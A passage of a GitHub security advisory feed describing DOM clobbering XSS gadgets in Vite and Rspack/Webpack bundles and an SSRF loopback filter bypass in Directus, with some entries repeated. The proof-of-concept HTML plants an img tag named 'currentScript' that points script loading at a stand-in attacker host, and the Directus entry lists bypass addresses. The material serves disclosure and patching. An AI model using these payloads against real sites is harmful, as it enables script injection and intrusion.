<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite] Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-64vr-g452-qvp3</id>
        <link href="https://github.com/advisories/GHSA-64vr-g452-qvp3"/>
        <updated>2024-09-19T18:33:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>We discovered a DOM Clobbering vulnerability in Vite when building scripts to <code>cjs</code>/<code>iife</code>/<code>umd</code> output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>Note that, we have identified similar security issues in Webpack: <a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></p>
<h3 id="details">Details</h3>
<p><strong>Backgrounds</strong></p>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">https://research.securitum.com/xss-in-amp4email-dom-clobbering/</a></p>
<p><strong>Gadgets found in Vite</strong></p>
<p>We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to <code>cjs</code>, <code>iife</code>, or <code>umd</code>. In such cases, Vite replaces relative paths starting with <code>__VITE_ASSET__</code> using the URL retrieved from <code>document.currentScript</code>.</p>
<p>However, this implementation is vulnerable to a DOM Clobbering attack. The <code>document.currentScript</code> lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.</p>
<pre><code>const relativeUrlMechanisms = {
  amd: (relativePath) =&gt; {
    if (relativePath[0] !== ".") relativePath = "./" + relativePath;
    return getResolveUrl(
      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`
    );
  },
  cjs: (relativePath) =&gt; `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath)})`,
  es: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`
  ),
  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
  // NOTE: make sure rollup generate `module` params
  system: (relativePath) =&gt; getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`
  ),
  umd: (relativePath) =&gt; `(typeof document === 'undefined' &amp;&amp; typeof location === 'undefined' ? ${getFileUrlFromRelativePath(
    relativePath
  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
};
</code></pre>
<h3 id="poc">PoC</h3>
<p>Considering a website that contains the following <code>main.js</code> script, the devloper decides to use the Vite to bundle up the program with the following configuration. </p>
<pre><code>// main.js
import extraURL from './extra.js?url'
var s = document.createElement('script')
s.src = extraURL
document.head.append(s)
</code></pre>
<pre><code>// extra.js
export default "https://myserver/justAnOther.js"
</code></pre>
<pre><code>// vite.config.js
import { defineConfig } from 'vite'

export default defineConfig({
  build: {
    assetsInlineLimit: 0, // To avoid inline assets for PoC
    rollupOptions: {
      output: {
        format: "cjs"
      },
    },
  },
  base: "./",
});
</code></pre>
<p>After running the build command, the developer will get following bundle as the output.</p>
<pre><code>// dist/index-DDmIg9VD.js
"use strict";const t=""+(typeof document&gt;"u"?require("url").pathToFileURL(__dirname+"/extra-BLVEx9Lb.js").href:new URL("extra-BLVEx9Lb.js",document.currentScript&amp;&amp;document.currentScript.src||document.baseURI).href);var e=document.createElement("script");e.src=t;document.head.append(e);
</code></pre>
<p>Adding the Vite bundled script, <code>dist/index-DDmIg9VD.js</code>, as part of the web page source code, the page could load the <code>extra.js</code> file from the attacker's domain, <code>attacker.controlled.server</code>. The attacker only needs to insert an <code>img</code> tag with the <code>name</code> attribute set to <code>currentScript</code>. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Vite Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script type="module" crossorigin src="/assets/index-DDmIg9VD.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of <code>cjs</code>, <code>iife</code>, or <code>umd</code>) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.</p>
<h3 id="patch">Patch</h3>
<pre><code>// https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296
const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
  getResolveUrl(
    `'${escapeId(partialEncodeURIPath(relativePath))}', ${
      umd ? `typeof document === 'undefined' ? location.href : ` : ''
    }document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT' &amp;&amp; document.currentScript.src || document.baseURI`,
  )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3">https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af">https://github.com/vitejs/vite/commit/179b17773cf35c73ddb041f9e6c703fd9f3126af</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675">https://github.com/vitejs/vite/commit/2691bb3ff6b073b41fb9046909e1e03a74e36675</a></li>
<li><a href="https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd">https://github.com/vitejs/vite/commit/2ddd8541ec3b2d2e5b698749e0f2362ef28056bd</a></li>
<li><a href="https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3">https://github.com/vitejs/vite/commit/e8127166979e7ace6eeaa2c3b733c8994caa31f3</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e">https://github.com/vitejs/vite/commit/ebb94c5b3bf41950f45562595adec117a4d0ba5e</a></li>
<li><a href="https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45812">https://nvd.nist.gov/vuln/detail/CVE-2024-45812</a></li>
<li><a href="https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad">https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad</a></li>
<li><a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering">https://research.securitum.com/xss-in-amp4email-dom-clobbering</a></li>
<li><a href="https://scnps.co/papers/sp23_domclob.pdf">https://scnps.co/papers/sp23_domclob.pdf</a></li>
<li><a href="https://github.com/advisories/GHSA-64vr-g452-qvp3">https://github.com/advisories/GHSA-64vr-g452-qvp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64vr-g452-qvp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-17T19:28:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@rspack/core] DOM Clobbering Gadget found in Rspack's AutoPublicPathRuntimeModule that leads to XSS]]></title>
        <id>https://github.com/advisories/GHSA-84jw-g43v-8gjm</id>
        <link href="https://github.com/advisories/GHSA-84jw-g43v-8gjm"/>
        <updated>2024-09-19T17:30:06.000Z</updated>
        <content type="html"><![CDATA[<p>Hi, Rspack|Webpack developer team!</p>
<h2 id="summary">Summary</h2>
<p>We discovered a DOM Clobbering vulnerability in Webpack’s AutoPublicPathRuntimeModule. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.</p>
<p>We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.</p>
<h2 id="details">Details</h2>
<h3 id="backgrounds">Backgrounds</h3>
<p>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:</p>
<p>[1] <a href="https://scnps.co/papers/sp23_domclob.pdf">scnps.co/papers/sp23_domclob.pdf</a>
[2] <a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">research.securitum.com/xss-in-amp4email-dom-clobbering</a></p>
<h3 id="gadgets-found-in-webpack--rspack">Gadgets found in Webpack | Rspack</h3>
<p>We identified a DOM Clobbering vulnerability in Webpack’s AutoPublicPathRuntimeModule. When the output.publicPath field in the configuration is not set or is set to auto, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:</p>
<pre><code class="language-js">/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() =&gt; {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl &amp;&amp; document) {
/******/ 			if (document.currentScript)
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i &gt; -1 &amp;&amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
</code></pre>
<p>However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with document.currentScript can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the src attribute of the attacker-controlled element will be used as the scriptUrl and assigned to <strong>webpack_require</strong>.p. If additional scripts are loaded from the server, <strong>webpack_require</strong>.p will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.</p>
<h2 id="poc">PoC</h2>
<p>Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.</p>
<p>Consider a website developer with the following two scripts, entry.js and import1.js, that are compiled using Webpack:</p>
<pre><code class="language-js">// entry.js
import('./import1.js')
  .then(module =&gt; {
    module.hello();
  })
  .catch(err =&gt; {
    console.error('Failed to load module', err);
  });
</code></pre>
<pre><code class="language-js">// import1.js
export function hello () {
  console.log('Hello');
}
The webpack.config.js is set up as follows:

const path = require('path');

module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    publicPath: "auto", // Or leave this field not set
  },
  target: 'web',
  mode: 'development',
};
</code></pre>
<p>When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the import1.js file from the attacker's domain, attacker.controlled.server. The attacker only needs to insert an img tag with the name attribute set to currentScript. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Webpack Example&lt;/title&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
  &lt;img name="currentScript" src="https://attacker.controlled.server/"&gt;&lt;/img&gt;
  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
&lt;/head&gt;
&lt;script src="./dist/webpack-gadgets.bundle.js"&gt;&lt;/script&gt;
&lt;body&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="impact">Impact</h2>
<p>This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.</p>
<h2 id="patch">Patch</h2>
<p>A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: <a href="https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174">google/closure-library@b312823/closure/goog/base.js#L174</a></p>
<pre><code class="language-js">/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() =&gt; {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl &amp;&amp; document) {
/******/ 			if (document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :&gt;
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i &gt; -1 &amp;&amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
</code></pre>
<p>Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/web-infra-dev/rspack/security/advisories/GHSA-84jw-g43v-8gjm">https://github.com/web-infra-dev/rspack/security/advisories/GHSA-84jw-g43v-8gjm</a></li>
<li><a href="https://github.com/web-infra-dev/rspack/commit/0303c68bd76da258c9fd483936d3a00b9761aad0">https://github.com/web-infra-dev/rspack/commit/0303c68bd76da258c9fd483936d3a00b9761aad0</a></li>
<li><a href="https://github.com/advisories/GHSA-84jw-g43v-8gjm">https://github.com/advisories/GHSA-84jw-g43v-8gjm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-84jw-g43v-8gjm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-19T17:30:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/api] Directus vulnerable to SSRF Loopback IP filter bypass]]></title>
        <id>https://github.com/advisories/GHSA-68g8-c275-xf2m</id>
        <link href="https://github.com/advisories/GHSA-68g8-c275-xf2m"/>
        <updated>2024-09-19T15:42:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If you're relying on blocking access to localhost using the default <code>0.0.0.0</code> filter this can be bypassed using other registered loopback devices (like <code>127.0.0.2</code> - <code>127.127.127.127</code>)</p>
<h3 id="workaround">Workaround</h3>
<p>You can block this bypass by manually adding the <code>127.0.0.0/8</code> CIDR range which will block access to any <code>127.X.X.X</code> ip instead of just <code>127.0.0.1</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-68g8-c275-xf2m">https://github.com/directus/directus/security/advisories/GHSA-68g8-c275-xf2m</a></li>
<li><a href="https://github.com/directus/directus/commit/8cbf943b65fd4a763d09a5fdbba8996b1e7797ff">https://github.com/directus/directus/commit/8cbf943b65fd4a763d09a5fdbba8996b1e7797ff</a></li>
<li><a href="https://github.com/directus/directus/commit/c1f3ccc681595038d094ce110ddeee38cb38f431">https://github.com/directus/directus/commit/c1f3ccc681595038d094ce110ddeee38cb38f431</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46990">https://nvd.nist.gov/vuln/detail/CVE-2024-46990</a></li>
<li><a href="https://github.com/directus/directus/commit/4aace0bbe57232e38cd6a287ee475293e46dc91b">https://github.com/directus/directus/commit/4aace0bbe57232e38cd6a287ee475293e46dc91b</a></li>
<li><a href="https://github.com/directus/directus/commit/769fa22797bff5a9231599883b391e013f122e52">https://github.com/directus/directus/commit/769fa22797bff5a9231599883b391e013f122e52</a></li>
<li><a href="https://github.com/advisories/GHSA-68g8-c275-xf2m">https://github.com/advisories/GHSA-68g8-c275-xf2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68g8-c275-xf2m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-18T17:42:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/api] Directus vulnerable to SSRF Loopback IP filter bypass]]></title>
        <id>https://github.com/advisories/GHSA-68g8-c275-xf2m</id>
        <link href="https://github.com/advisories/GHSA-68g8-c275-xf2m"/>
        <updated>2024-09-19T15:42:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If you're relying on blocking access to localhost using the default <code>0.0.0.0</code> filter this can be bypassed using other registered loopback devices (like <code>127.0.0.2</code> - <code>127.127.127.127</code>)</p>
<h3 id="workaround">Workaround</h3>
<p>You can block this bypass by manually adding the <code>127.0.0.0/8</code> CIDR range which will block access to any <code>127.X.X.X</code> ip instead of just <code>127.0.0.1</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-68g8-c275-xf2m">https://github.com/directus/directus/security/advisories/GHSA-68g8-c275-xf2m</a></li>
<li><a href="https://github.com/directus/directus/commit/8cbf943b65fd4a763d09a5fdbba8996b1e7797ff">https://github.com/directus/directus/commit/8cbf943b65fd4a763d09a5fdbba8996b1e7797ff</a></li>
<li><a href="https://github.com/directus/directus/commit/c1f3ccc681595038d094ce110ddeee38cb38f431">https://github.com/directus/directus/commit/c1f3ccc681595038d094ce110ddeee38cb38f431</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46990">https://nvd.nist.gov/vuln/detail/CVE-2024-46990</a></li>
<li><a href="https://github.com/directus/directus/commit/4aace0bbe57232e38cd6a287ee475293e46dc91b">https://github.com/directus/directus/commit/4aace0bbe57232e38cd6a287ee475293e46dc91b</a></li>
<li><a href="https://github.com/directus/directus/commit/769fa22797bff5a9231599883b391e013f122e52">https://github.com/directus/directus/commit/769fa22797bff5a9231599883b391e013f122e52</a></li>
<li><a href="https://github.com/advisories/GHSA-68g8-c275-xf2m">https://github.com/advisories/GHSA-68g8-c275-xf2m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68g8-c275-xf2m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-09-18T17:42:05.000Z</published>
    </entry>
    <entry>
